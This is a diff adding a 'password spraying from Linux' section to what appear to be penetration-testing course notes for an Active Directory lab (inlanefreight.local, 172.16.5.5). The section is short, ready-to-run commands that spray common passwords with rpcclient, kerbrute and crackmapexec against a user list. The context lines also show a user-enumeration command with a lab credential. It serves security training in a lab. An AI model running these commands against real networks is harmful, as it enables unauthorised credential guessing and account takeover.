@@ -201,3 +201,18 @@ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
 
 # Internal Password Spraying - from Linux
+
+#### Using a Bash one-liner for the Attack
+```shell
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+
+#### Using Kerbrute for the Attack
+```shell
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+```
+
+#### Using CrackMapExec & Filtering Logon Failures
+```shell
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+```
